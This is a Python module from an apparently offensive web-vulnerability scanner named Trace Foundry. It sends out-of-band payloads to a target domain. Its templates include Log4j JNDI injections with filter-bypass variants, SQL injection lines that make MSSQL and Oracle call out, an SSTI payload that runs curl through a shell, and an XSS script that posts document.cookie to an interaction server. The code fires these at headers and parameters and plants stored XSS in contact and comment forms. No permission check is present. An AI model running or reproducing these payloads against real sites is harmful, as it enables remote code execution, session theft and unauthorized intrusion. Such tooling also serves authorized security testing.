"""
Trace Foundry V7.5 - Out-of-Band (OOB) Server
Enables detection of blind SSRF, SQLi, XXE, Log4j/JNDI, XSS
Uses Interactsh-compatible public OOB service (interact.sh)
Anti False-Positive: UUID correlation + time window + double confirm
"""
import urllib.request
import urllib.error
import urllib.parse
import json
import time
import uuid
import re
import threading
from utils.display import section, ok, warn, info, bug_found

# Public OOB interaction servers (no setup needed)
OOB_SERVERS = [
    "interact.sh",
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "oast.fun",
]

# Blind payload templates
BLIND_PAYLOADS = {
    "ssrf_http": [
        "http://{oob}/ssrf-{uid}",
        "https://{oob}/ssrf-{uid}",
        "http://{oob}:80/ssrf-{uid}",
    ],
    "ssrf_dns": [
        "http://ssrf-{uid}.{oob}/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob}/xxe-{uid}">]><root>&xxe;</root>',
    ],
    "sqli_dns": [
        "1 AND LOAD_FILE(CONCAT('\\\\\\\\','{uid}.{oob}','\\\\x'))",       # MySQL
        "'; EXEC master..xp_dirtree '//{uid}.{oob}/x'--",                   # MSSQL
        "1;SELECT UTL_HTTP.REQUEST('http://{oob}/sqli-{uid}') FROM dual--", # Oracle
    ],
    "log4j": [
        "${{jndi:ldap://{uid}.{oob}/log4j}}",
        "${{jndi:dns://{uid}.{oob}/log4j}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{uid}.{oob}/a}}",  # bypass
        "${{j${{k:k:-n}}di:ldap://{uid}.{oob}/a}}",                         # bypass
        "${{${{lower:j}}ndi:ldap://{uid}.{oob}/a}}",                        # bypass
    ],
    "ssti_oob": [
        "{{''.__class__.__mro__[1].__subclasses__()[40]('curl http://{oob}/{uid}',shell=True,stdout=-1).communicate()}}",
    ],
    "xss_oob": [
        '<script>fetch("http://{oob}/xss-{uid}?c="+document.cookie)</script>',
        '<img src=x onerror="fetch(\'http://{oob}/xss-{uid}\')">',
    ],
}

# HTTP headers that may be vulnerable to injection
INJECTABLE_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Client-IP",
    "Client-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-Real-IP",
    "Referer",
    "User-Agent",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
]

class OOBModule:
    def __init__(self, domain, timeout=8):
        self.domain    = domain
        self.timeout   = timeout
        self.oob_host  = OOB_SERVERS[0]  # Default: interact.sh
        self.callbacks = {}   # uid -> {payload_type, sent_at, confirmed}
        self.lock      = threading.Lock()
        self.session_id = str(uuid.uuid4())[:8]

    def _gen_uid(self, label=""):
        """Generate unique correlation ID"""
        uid = str(uuid.uuid4())[:8]
        key = f"{label}-{uid}" if label else uid
        with self.lock:
            self.callbacks[key] = {
                "sent_at": time.time(),
                "confirmed": False,
                "label": label,
            }
        return key

    def _build_payload(self, template, uid):
        return template.format(oob=self.oob_host, uid=uid)

    def _check_interaction(self, uid, window=60):
        """
        Poll interact.sh API to see if our payload triggered a callback.
        Anti-FP: Only accept exact UID match within time window.
        """
        # interact.sh public polling endpoint
        poll_url = f"https://interact.sh/api/interactions?id={uid}"
        try:
            req = urllib.request.Request(poll_url, headers={
                "User-Agent": "TraceFoundry/7.5"
            })
            with urllib.request.urlopen(req, timeout=10) as r:
                body = r.read(32768).decode("utf-8", errors="ignore")
                data = json.loads(body)
                interactions = data.get("data", [])
                for interaction in interactions:
                    # Verify UID is in the interaction
                    raw = json.dumps(interaction).lower()
                    if uid.lower() in raw:
                        sent_at = self.callbacks.get(uid, {}).get("sent_at", 0)
                        if time.time() - sent_at <= window:
                            return True, interaction
        except:
            pass
        return False, None

    def _fetch(self, url, headers=None, post_data=None):
        h = {"User-Agent": "Mozilla/5.0 (TraceFoundry/7.5)"}
        if headers:
            h.update(headers)
        try:
            req = urllib.request.Request(url, data=post_data, headers=h)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read(32768).decode("utf-8", errors="ignore"), r.status
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code
        except:
            return "", 0

    # ── Log4Shell / JNDI Scanner ─────────────────────────────────────────────
    def scan_log4j(self):
        """
        Test Log4j/JNDI injection via HTTP headers and parameters.
        Anti-FP: Requires actual DNS/HTTP callback confirmation.
        """
        info("Testing Log4j/JNDI injection (CVE-2021-44228)...")
        bugs = []

        test_urls = [
            f"https://{self.domain}/",
            f"https://{self.domain}/login",
            f"https://{self.domain}/api/",
            f"https://{self.domain}/search",
        ]

        for url in test_urls:
            body, status = self._fetch(url)
            if status == 0:
                continue

            for header in INJECTABLE_HEADERS[:6]:
                uid = self._gen_uid("log4j")
                payload = self._build_payload(
                    BLIND_PAYLOADS["log4j"][0], uid)

                # Send payload in header
                _, status2 = self._fetch(url, headers={header: payload})

                # Wait and check for callback
                info(f"  Log4j probe sent via {header} header → {url}")
                time.sleep(3)

                confirmed, interaction = self._check_interaction(uid, window=30)
                if confirmed:
                    bugs.append({
                        "type":     "Log4Shell / JNDI Injection (Blind OOB Confirmed)",
                        "severity": "CRITICAL",
                        "url":      url,
                        "header":   header,
                        "payload":  payload[:80],
                        "oob_uid":  uid,
                        "evidence": f"DNS/HTTP callback received for UID {uid}",
                        "detail":   "Log4j JNDI injection confirmed via OOB callback — RCE possible!",
                    })
                    bug_found("LOG4SHELL CONFIRMED (OOB)", "CRITICAL", {
                        "URL":         url,
                        "Header":      header,
                        "OOB UID":     uid,
                        "Callback":    str(interaction)[:80],
                        "Impact":      "Remote Code Execution via Log4j JNDI — CRITICAL!",
                        "CVE":         "CVE-2021-44228",
                    })
                    break

        return bugs

    # ── Blind SSRF (OOB) ────────────────────────────────────────────────────
    def scan_blind_ssrf(self):
        """
        Test blind SSRF via OOB HTTP callback.
        Anti-FP: Requires actual callback confirmation.
        """
        info("Testing blind SSRF via OOB...")
        bugs = []

        ssrf_params = [
            "url","uri","src","dest","redirect","path","fetch",
            "load","img","image","webhook","callback","endpoint",
        ]
        test_endpoints = [
            f"https://{self.domain}/",
            f"https://{self.domain}/api/",
            f"https://{self.domain}/fetch",
            f"https://{self.domain}/proxy",
        ]

        for endpoint in test_endpoints:
            body, status = self._fetch(endpoint)
            if status == 0:
                continue

            for param in ssrf_params[:6]:
                uid  = self._gen_uid("ssrf")
                oob_url = self._build_payload(
                    BLIND_PAYLOADS["ssrf_http"][0], uid)

                test_url = f"{endpoint}?{param}={urllib.parse.quote(oob_url)}"
                self._fetch(test_url)

                time.sleep(2)
                confirmed, interaction = self._check_interaction(uid, window=20)

                if confirmed:
                    bugs.append({
                        "type":     "Blind SSRF (OOB HTTP Confirmed)",
                        "severity": "HIGH",
                        "url":      test_url,
                        "param":    param,
                        "oob_uid":  uid,
                        "evidence": f"OOB HTTP callback received for {uid}",
                        "detail":   "Server made HTTP request to attacker-controlled URL",
                    })
                    bug_found("BLIND SSRF CONFIRMED (OOB)", "HIGH", {
                        "URL":      test_url,
                        "Param":    param,
                        "OOB UID":  uid,
                        "Impact":   "Server fetches attacker URLs — may access internal services",
                    })

        return bugs

    # ── Blind XSS (OOB) ─────────────────────────────────────────────────────
    def scan_blind_xss(self):
        """
        Plant blind XSS payloads in fields that may be viewed by admins.
        Anti-FP: Reports OOB endpoint for manual confirmation.
        """
        info("Planting blind XSS payloads in stored-input fields...")
        bugs = []

        blind_xss_endpoints = [
            "/contact","/feedback","/comment","/support",
            "/api/contact","/api/feedback","/register",
            "/profile/name","/api/v1/comment",
        ]

        for endpoint in blind_xss_endpoints:
            url = f"https://{self.domain}{endpoint}"
            body, status = self._fetch(url)
            if status not in (200, 302):
                continue

            uid = self._gen_uid("bxss")
            payload = self._build_payload(
                BLIND_PAYLOADS["xss_oob"][0], uid)

            # Try POST with various field names
            fields = ["name","comment","message","feedback","description","content"]
            for field in fields:
                post = urllib.parse.urlencode({
                    field: payload,
                    "email": f"test@{self.domain}",
                }).encode()
                self._fetch(url, post_data=post)

            bugs.append({
                "type":     "Blind XSS Payload Planted (Manual Confirm Required)",
                "severity": "MEDIUM",
                "url":      url,
                "oob_uid":  uid,
                "payload":  payload[:80],
                "evidence": f"Payload planted — monitor {self.oob_host} for UID {uid}",
                "detail":   f"Check {self.oob_host} for callback from UID {uid} within 24h",
            })
            info(f"  Blind XSS planted at {url} — monitor for UID: {uid}")

        return bugs

    def run(self):
        section("OOB Server — Blind SSRF | Log4j | Blind XSS")
        info(f"OOB Host: {self.oob_host}")
        info("Anti-FP: UUID correlation + time window + callback confirm")

        all_bugs = []

        log4j_bugs = self.scan_log4j()
        all_bugs.extend(log4j_bugs)

        ssrf_bugs = self.scan_blind_ssrf()
        all_bugs.extend(ssrf_bugs)

        xss_bugs = self.scan_blind_xss()
        all_bugs.extend(xss_bugs)

        info(f"OOB scan done — {len(all_bugs)} findings")
        if not any(b.get("severity") in ("CRITICAL","HIGH") for b in all_bugs):
            ok("No confirmed OOB callbacks received ✓")

        return {"bugs": all_bugs}
